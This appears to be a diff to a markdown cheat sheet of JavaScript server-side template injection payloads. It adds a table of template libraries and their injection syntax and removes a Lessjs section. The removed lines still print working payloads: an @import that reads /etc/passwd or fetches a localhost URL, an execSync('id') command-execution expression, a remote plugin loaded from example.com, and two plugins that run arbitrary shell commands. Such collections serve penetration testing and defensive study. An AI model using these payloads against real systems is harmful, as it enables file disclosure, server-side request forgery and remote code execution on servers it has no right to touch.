@@ -2,15 +2,31 @@
 
 ## Summary
 
+- [Templating Libraries](#templating-libraries)
 - [Handlebars](#handlebars)
     - [Handlebars - Command Execution](#handlebars---command-execution)
-- [Lessjs](#lessjs)
-    - [Lessjs - SSRF / LFI](#lessjs---ssrf--lfi)
-    - [Lessjs < v3 - Command Execution](#lessjs--v3---command-execution)
-    - [Lessjs Plugins](#lessjs-plugins)
 - [Lodash](#Lodash)
     - [Lodash - Basic Injection](#lodash---basic-injection)
     - [Lodash - Command Execution](#lodash---command-execution)
+
+
+## Templating Libraries
+
+| Template Name | Payload Format |
+| ------------ | --------- |
+| DotJS        | `{{= }}`  |
+| DustJS       | `{}`      |
+| EJS          | `<% %>`   |
+| HandlebarsJS | `{{ }}`   |
+| HoganJS      | `{{ }}`   |
+| Lodash       | `{{= }}`  |
+| MustacheJS   | `{{ }}`   |
+| NunjucksJS   | `{{ }}`   |
+| PugJS        | `#{}`     |
+| TwigJS       | `{{ }}`   |
+| UnderscoreJS | `<% %>`   |
+| VelocityJS   | `#=set($X="")$X` |
+| VueJS        | `{{ }}`   |
 
 
 ## Handlebars
@@ -40,63 +56,6 @@
     {{/with}}
   {{/with}}
 {{/with}}
-```
-
----
-
-## Lessjs
-
-[Official website](https://lesscss.org/)
-> Less (which stands for Leaner Style Sheets) is a backwards-compatible language extension for CSS. This is the official documentation for Less, the language and Less.js, the JavaScript tool that converts your Less styles to CSS styles.
-
-### Lessjs - SSRF / LFI
-
-```less
-@import (inline) "http://localhost";
-// or
-@import (inline) "/etc/passwd";
-```
-
-### Lessjs < v3 - Command Execution
-
-```less
-body {
-  color: `global.process.mainModule.require("child_process").execSync("id")`;
-}
-```
-
-### Lessjs Plugins
-
-Lessjs plugins can be remotely included and are composed of Javascript which gets executed when the Less is transpiled.
-
-```less
-// example local plugin usage
-@plugin "plugin-2.7.js";
-```
-or
-```less
-// example remote plugin usage
-@plugin "http://example.com/plugin-2.7.js"
-```
-
-version 2 example RCE plugin:
-
-```javascript
-functions.add('cmd', function(val) {
-  return `"${global.process.mainModule.require('child_process').execSync(val.value)}"`;
-});
-```
-version 3 and above example RCE plugin
-
-```javascript
-//Vulnerable plugin (3.13.1)
-registerPlugin({
-    install: function(less, pluginManager, functions) {
-        functions.add('cmd', function(val) {
-            return global.process.mainModule.require('child_process').execSync(val.value).toString();
-        });
-    }
-})
 ```
 
 ---
